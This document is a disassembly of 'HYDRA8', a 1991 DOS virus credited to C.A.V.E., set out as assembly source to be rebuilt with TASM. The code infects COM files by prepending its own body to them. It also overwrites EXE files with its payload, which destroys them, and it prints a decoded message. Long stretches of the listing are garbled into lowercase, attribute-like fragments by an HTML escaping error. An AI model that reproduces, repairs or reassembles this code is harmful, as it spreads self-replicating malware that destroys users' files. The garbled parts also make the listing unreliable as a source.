

  
PAGE  59,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ                             HYDRA8                                   ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ  Disassembly by: -=>Wasp<=- aka="">>Night Crawler< ûû="" ;ûû="" ûû="" ;ûû="" reassemble="" with="" tasm="" 2.0="" ûû="" ;ûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûûû="" data_1e="" equ="" 80h="" data_16e="" equ="" 1efh="" data_17e="" equ="" 1f2h="" data_18e="" equ="" 9d9ah="" seg_a="" segment="" byte="" public="" assume="" cs:seg_a,="" ds:seg_a="" org="" 100h="" hydra8="" proc="" far="" start:="" jmp="" loc_2="" ;="" (01e2)="" db="" 59h,="" 44h,="" 00h,="" 00h="" data_4="" db="" 'hydra-8="" beta="" -="" not="" for="" release'="" db="" '.="" *.co?'="" db="" 0="" data_7="" dw="" 0,="" 84fch="" data_9="" dw="" 0="" data_10="" db="" 0="" db="" 29="" dup="" (0)="" data_11="" db="" 0="" db="" 0,="" 0,="" 0,="" 0,="" 0,="" 0="" data_12="" db="" 0="" db="" 0,="" 0,="" 0,="" 0,="" 0,="" 0="" copyright="" db="" 'copyright="" (c)'="" db="" '="" 1991="" by="" c.a.v.e.="" '="" data_13="" db="" 2ah="" db="" 2eh,="" 45h,="" 58h,="" 45h,="" 00h="" data_14="" db="" 33h="" db="" 0c9h,="" 1eh,="" 52h,0e8h,="" 06h,="" 00h="" db="" 0e8h,="" 13h,="" 00h,0ebh,="" 36h,="" 90h="" db="" 0beh,="" 48h,="" 01h,0bfh,="" 5ah,="" 01h="" db="" 0b9h,="" 12h,="" 00h="" locloop_1:="" xor="" byte="" ptr="" [si],0f5h="" movsb="" ;="" mov="" [si]="" to="" es:[di]="" loop="" locloop_1="" ;="" loop="" if="" cx=""> 0
  
		RETN
		MOV	AX,0F00H
		INT	10H			; Video display   ah=functn 0Fh
						;  get state, al=mode, bh=page
		MOV	AH,0
		INT	10H			; Video display   ah=functn 00h
						;  set display mode in al
		MOV	AX,200H
		MOV	DH,0CH
		MOV	DL,1FH
		INT	10H			; Video display   ah=functn 02h
						;  set cursor location in dx
		XOR	DX,DX			; Zero register
		MOV	DX,OFFSET DATA_12
		MOV	AH,9
		INT	21H			; DOS Services  ah=function 09h
						;  display char string at ds:dx
		MOV	AX,200H
		MOV	DH,18H
		MOV	DL,0
		INT	10H			; Video display   ah=functn 02h
						;  set cursor location in dx
		RETN
		MOV	AX,4C00H
		INT	21H			; DOS Services  ah=function 4Ch
						;  terminate with al=return code
		ADD	[BP+SI-6563H],AH
		CMC				; Complement carry
		PUSHF				; Push flags
		XCHG	DH,CH
		MOV	DI,DATA_18E
		DB	 9BH,0F5H,0B2H, 94H, 99H, 81H
		DB	0CAH,0D1H
LOC_2:
		PUSH	AX
		MOV	AX,CS
		ADD	AX,1000H
		XOR	DI,DI			; Zero register
		MOV	CX,1EFH
		MOV	SI,OFFSET DS:[100H]
		MOV	ES,AX
		REP	MOVSB			; Rep when cx >0 Mov [si] to es:[di]
		MOV	AH,1AH
		MOV	DX,OFFSET DATA_10
		INT	21H			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		MOV	AH,4EH			; 'N'
		MOV	DX,OFFSET DATA_4+22H
		INT	21H			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		JC	LOC_6			; Jump if carry Set
LOC_3:
		MOV	AH,3DH			; '='
		MOV	AL,2
		MOV	DX,OFFSET DATA_11
		INT	21H			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		MOV	BX,AX
		PUSH	ES
		POP	DS
		MOV	AX,3F00H
		MOV	CX,0FFFFH
		MOV	DX,DATA_16E
		INT	21H			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		ADD	AX,1EFH
		MOV	CS:DATA_9,AX
		CMP	WORD PTR DS:DATA_17E,4459H
		JNE	LOC_4			; Jump if not equal
		MOV	AH,3EH			; '>'
		INT	21H			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		PUSH	CS
		POP	DS
		MOV	AH,4FH			; 'O'
		INT	21H			; DOS Services  ah=function 4Fh
						;  find next filename match
		JC	LOC_7			; Jump if carry Set
		JMP	SHORT LOC_3		; (0204)
LOC_4:
		XOR	CX,CX			; Zero register
		MOV	DX,CX
		MOV	AX,4200H
		INT	21H			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		JC	LOC_5			; Jump if carry Set
		MOV	AH,40H			; '@'
		XOR	DX,DX			; Zero register
		MOV	CX,CS:DATA_9
		INT	21H			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
LOC_5:
		MOV	AH,3EH			; '>'
		INT	21H			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		PUSH	CS
		POP	DS
LOC_6:
		MOV	AH,1AH
		MOV	DX,DATA_1E
		INT	21H			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		JMP	SHORT LOC_10		; (02B0)
		DB	90H
LOC_7:
		CLC				; Clear carry flag
		XOR	CX,CX			; Zero register
		PUSH	DS
		PUSH	DX
		MOV	AH,1AH
		MOV	DX,OFFSET DATA_10
		INT	21H			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		MOV	DX,OFFSET DATA_13
		MOV	AH,4EH			; 'N'
		XOR	CX,CX			; Zero register
		INT	21H			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		JC	LOC_6			; Jump if carry Set
LOC_8:
		MOV	AH,3CH			; '<' xor="" cx,cx="" ;="" zero="" register="" mov="" dx,offset="" data_11="" int="" 21h="" ;="" dos="" services="" ah="function" 3ch="" ;="" create/truncate="" file="" @="" ds:dx="" mov="" bx,ax="" jc="" loc_6="" ;="" jump="" if="" carry="" set="" mov="" ax,3d02h="" mov="" dx,offset="" data_11="" int="" 21h="" ;="" dos="" services="" ah="function" 3dh="" ;="" open="" file,="" al="mode,name@ds:dx" mov="" bx,ax="" clc="" ;="" clear="" carry="" flag="" xor="" dx,dx="" ;="" zero="" register="" mov="" ah,40h="" ;="" '@'="" mov="" dx,offset="" data_14="" mov="" cx,5ah="" int="" 21h="" ;="" dos="" services="" ah="function" 40h="" ;="" write="" file="" cx="bytes," to="" ds:dx="" cmp="" ax,5ah="" jb="" loc_9="" ;="" jump="" if="" below="" mov="" ah,3eh="" ;="" '="">'
		INT	21H			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		JC	LOC_9			; Jump if carry Set
		MOV	AH,4FH			; 'O'
		INT	21H			; DOS Services  ah=function 4Fh
						;  find next filename match
		JNC	LOC_8			; Jump if carry=0
LOC_9:
		MOV	AX,4C00H
		INT	21H			; DOS Services  ah=function 4Ch
						;  terminate with al=return code
LOC_10:
		XOR	DI,DI			; Zero register
		MOV	SI,OFFSET DATA_15
		MOV	CX,22H
		REP	MOVSB			; Rep when cx >0 Mov [si] to es:[di]
		POP	BX
		MOV	CS:DATA_7,0
		MOV	WORD PTR CS:DATA_7+2,ES
		POP	BX
		JMP	DWORD PTR CS:DATA_7
DATA_15		DB	1EH
		DB	 07H,0B9H,0FFH,0FFH,0BEH,0EFH
		DB	 02H,0BFH, 00H, 01H, 2BH,0CEH
		DB	0F3H,0A4H, 2EH,0C7H, 06H, 00H
		DB	 01H, 00H, 01H, 2EH, 8CH, 1EH
		DB	 02H, 01H, 8BH,0C3H, 2EH,0FFH
		DB	 2EH, 00H, 01H,0CDH
		DB	20H
  
HYDRA8		ENDP
  
SEG_A		ENDS
  
  
  
		END	START

</'></=->